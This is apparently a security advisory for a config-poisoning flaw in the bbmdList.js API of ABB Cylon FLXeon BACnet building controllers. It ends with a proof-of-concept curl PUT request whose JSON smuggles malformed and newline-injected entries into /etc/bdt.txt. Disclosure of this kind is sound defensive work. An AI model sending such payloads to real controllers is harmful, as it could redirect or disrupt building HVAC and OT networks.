@@ -1,0 +1,93 @@
+
+ABB Cylon FLXeon 9.3.5 (bbmdList.js) Authenticated Config Poisoning
+
+
+Vendor: ABB Ltd.
+Product web page: https://www.global.abb                   
+Affected version: FLXeon Series (FBXi Series, FBTi Series, FBVi Series)
+                  CBX Series (FLX Series)
+                  CBT Series
+                  CBV Series
+                  Firmware: <=9.3.5
+
+Summary: BACnet® Smart Building Controllers. ABB's BACnet portfolio features a
+series of BACnet® IP and BACnet MS/TP field controllers for ASPECT® and INTEGRA™
+building management solutions. ABB BACnet controllers are designed for intelligent
+control of HVAC equipment such as central plant, boilers, chillers, cooling towers,
+heat pump systems, air handling units (constant volume, variable air volume, and
+multi-zone), rooftop units, electrical systems such as lighting control, variable
+frequency drives and metering.
+
+The FLXeon Controller Series uses BACnet/IP standards to deliver unprecedented
+connectivity and open integration for your building automation systems. It's scalable,
+and modular, allowing you to control a diverse range of HVAC functions.
+
+Desc: The ABB Cylon FLXeon BACnet controller suffers from a configuration poisoning
+vulnerability in the put() function of bbmdList.js, where the writeFile() function
+is invoked to persist user-controlled data (req.body.bipList and req.body.natList)
+directly into sensitive configuration files (/etc/bdt.txt and /etc/bdt2.txt). This
+write operation lacks input validation and integrity checks allowing an attacker to
+supply crafted JSON payloads to inject or overwrite trusted BACnet BBMD entries. As
+these files are critical for network configuration, exploitation may result in unauthorized
+network redirection, denial of service, or insertion of rogue nodes into the system,
+thereby undermining the integrity and security of OT network communications.
+
+Tested on: Linux Kernel 5.4.27
+           Linux Kernel 4.15.13
+           NodeJS/8.4.0
+           Express
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2025-5935
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5935.php
+
+
+21.04.2024
+
+--
+
+
+$ cat project
+
+                 P   R   O   J   E   C   T
+
+                        .|
+                        | |
+                        |'|            ._____
+                ___    |  |            |.   |' .---"|
+        _    .-'   '-. |  |     .--'|  ||   | _|    |
+     .-'|  _.|  |    ||   '-__  |   |  |    ||      |
+     |' | |.    |    ||       | |   |  |    ||      |
+ ____|  '-'     '    ""       '-'   '-.'    '`      |____
+░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓███████▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+         ░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░ 
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░ 
+         ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░░▒▓██████▓▒░ ░▒▓██████▓▒░
+
+
+$ curl -k -X PUT "https://7.3.3.1/api/bbmdList" \
+> -H "Content-Type: application/json" \
+> -d '{\
+>    "bipList": [\
+>      { "ip": "127.0.0.1", "port": "9999", "mask": "255.255.255.255" },\
+>      { "ip": "MALFORMED_IP", "port": "notaport", "mask": "999.999.999.999" },\
+>      { "ip": "1.2.3.4", "port": "80", "mask": "0.0.0.0\nInjekcija,23,0xdeadbeef" }\
+>    ],\
+>    "natList": [\
+>      { "ip": "10.0.0.1", "port": "22", "mask": "255.255.255.0" }\
+>    ]\
+>  }'
